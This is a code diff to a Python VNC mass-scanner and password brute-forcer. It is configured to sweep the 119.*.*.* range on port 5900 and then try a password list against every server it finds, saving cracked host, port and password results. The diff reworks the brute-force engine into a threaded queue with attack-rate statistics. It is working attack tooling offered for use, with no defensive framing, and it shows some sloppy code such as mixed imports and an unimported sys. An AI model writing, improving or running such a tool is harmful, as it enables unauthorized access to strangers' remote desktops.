@@ -5,9 +5,13 @@ import os
 import cmd
 import socket
 import threading
+import time
+from Queue import Queue
 from multiprocessing.dummy import Pool as ThreadPool
+from multiprocessing.pool import ThreadPool
 import pickle
 import time
+from threading import Lock, Semaphore
 from sys import stdout
 from struct import pack, unpack
 # Define the colors
@@ -54,13 +58,13 @@ DEFAULT_PASSWORDS = """
 """
 
 # Default configuration for network scanning and brute forcing
-DEFAULT_CONFIG = {
+CONFIG = {
     'scan_range': "119.*.*.*",
     'scan_port': "5900",
-    'scan_timeout': "10",
+    'scan_timeout': "5",
     'scan_threads': "4000",
-    'brute_threads': "3000",
-    'brute_timeout': "10",
+    'brute_threads': "250",
+    'brute_timeout': "5",
     'auto_save': "true",
     'auto_brute': "true"
 }
@@ -700,7 +704,7 @@ class Deploy:
 				Files.file_write(file)
 
 		if Files.file_empty(FILES['config']):
-			Files.file_write(FILES['config'], pickle.dumps(DEFAULT_CONFIG))
+			Files.file_write(FILES['config'], pickle.dumps(CONFIG))
 
 		if Files.file_empty(FILES['passwords']):
 			Files.file_write(FILES['passwords'], DEFAULT_PASSWORDS)
@@ -1101,12 +1105,16 @@ class BruteEngine:
         self.servers = None
         self.current_password = None
         self.output_kill = False
+        self.attempt_count = 0
+        self.success_count = 0
+        self.exception_count = 0
+        self.start_time = None
 
     def init(self):
         global lock, semaphore
-        lock = threading.Lock()
-        semaphore = threading.Semaphore(int(CONFIG['brute_threads']))
-        self.results = open(FILES['results'], 'a', 0)
+        lock = Lock()
+        semaphore = Semaphore(int(CONFIG['brute_threads']))
+        self.results = open(FILES['results'], 'a')
         self.passwords = list()
         self.servers = list()
         self.get_passwords()
@@ -1115,64 +1123,97 @@ class BruteEngine:
     def Start(self):
         self.init()
         if not self.passwords:
-            stdout.write("\n\tThere are no passwords.\n")
+            sys.stdout.write("\n\tThere are no passwords.\n")
             return
         if not self.servers:
-            stdout.write("\n\tThere are no scanned ips.\n")
+            sys.stdout.write("\n\tThere are no scanned IPs.\n")
             return
 
+        self.start_time = time.time()
         output_thread = threading.Thread(target=self.output_thread)
         output_thread.daemon = True
         output_thread.start()
-        
-        try:
-            for self.current_password in self.passwords:
-                threads = []
-                for server in self.servers:
-                    semaphore.acquire()
-                    thread = threading.Thread(target=self.brute_thread, args=(server, self.current_password))
-                    thread.daemon = True
-                    thread.start()
-                    threads.append(thread)
-                
-                for thread in threads:
-                    thread.join()
-        except Exception as e:
-            stdout.write("\n\tFailed during brute-forcing with error: {}\n".format(e))
-        finally:
-            self.output_kill = True
-            self.results.close()
-            stdout.write("\n\nDONE! Check \"output/results.txt\" or type \"show results\"!\n\n")
+
+        queue = Queue()
+        threads = []
+
+        for _ in range(int(CONFIG['brute_threads'])):
+            thread = threading.Thread(target=self.worker, args=(queue,))
+            thread.daemon = True
+            thread.start()
+            threads.append(thread)
+
+        for password in self.passwords:
+            self.current_password = password
+            for server in self.servers[:]:  # use slicing to make a copy for safe iteration
+                queue.put((server, password))
+
+        queue.join()
+
+        self.output_kill = True
+        output_thread.join()
+        self.results.close()
+        sys.stdout.write("\n\nDONE! Check \"output/results.txt\" or type \"show results\"!\n\n")
+
+        for thread in threads:
+            thread.join()
+
+
+    def worker(self, queue):
+        while True:
+            server, password = queue.get()
+            self.brute_thread(server, password)
+            queue.task_done()
 
     def brute_thread(self, server, password):
+        semaphore.acquire()
         try:
+            # Assuming you've properly implemented RFBProtocol
             rfb = RFBProtocol(server[0], password, server[1], CONFIG['brute_timeout'])
             rfb.connect()
             rfb.close()
-            if rfb.RFB and rfb.connected:
-                result_data = "%s:%i-%s-[%s]\n" % (server[0], server[1], password, rfb.name)
-                lock.acquire()
-                try:
+            with lock:
+                self.attempt_count += 1
+                if rfb.RFB and rfb.connected:
+                    result_data = "{}:{}-{}-[{}]\n".format(server[0], server[1], password, rfb.name)
                     self.results.write(result_data)
-                    stdout.write("\r[*] {}:{} - {}              \n\n".format(server[0], server[1], password))
-                finally:
-                    lock.release()
-                self.servers.remove(server)
+                    self.results.flush()
+                    self.success_count += 1
+                    self.servers.remove(server)
         except Exception as e:
-            pass
+            with lock:
+                self.exception_count += 1
+            print("Error with server {}: {}".format(server[0], str(e)))
         finally:
             semaphore.release()
 
     def output_thread(self):
-        while not self.output_kill:
-            if self.current_password:
-                stdout.write("\r Trying \"%s\" on %i servers    " % (self.current_password, len(self.servers)))
-                time.sleep(0.2)
+        try:
+            while not self.output_kill:
+                if self.current_password:
+                    elapsed_time = time.time() - self.start_time
+                    passwords_per_second = self.attempt_count / elapsed_time if elapsed_time else 0
+                    sys.stdout.write(
+                        "\r\x1b[K" 
+                        "Trying '{}', Servers left: {}, Attempts: {}, Successes: {}, Errors: {}, Rate: {:.2f} p/s".format(
+                            self.current_password,
+                            len(self.servers),
+                            self.attempt_count,
+                            self.success_count,
+                            self.exception_count,
+                            passwords_per_second
+                        )
+                    )
+                    sys.stdout.flush()
+                time.sleep(0.5)
+        finally:
+            sys.stdout.write("\r\x1b[K")
+            sys.stdout.flush()
 
     def get_passwords(self):
         try:
             with open(FILES['passwords'], 'r') as file:
-                self.passwords = [line.strip() for line in file.readlines() if line.strip()]
+                self.passwords = [line.strip() for line in file if line.strip()]
         except IOError:
             self.passwords = False
 
@@ -1180,13 +1221,14 @@ class BruteEngine:
         try:
             with open(FILES['ips'], 'r') as file:
                 self.servers = []
-                for line in file.readlines():
-                    if ":" in line:
-                        parts = line.strip().split(":")
+                for line in file:
+                    part = line.strip()
+                    if ":" in part:
+                        parts = part.split(":")
                         if NetTools.is_ip(parts[0]) and Misc.is_int(parts[1]):
                             self.servers.append([parts[0], int(parts[1])])
-                    elif NetTools.is_ip(line.strip()):
-                        self.servers.append([line.strip(), CONFIG['scan_port']])
+                    elif NetTools.is_ip(part):
+                        self.servers.append([part, CONFIG['scan_port']])
         except IOError:
             self.servers = False
 
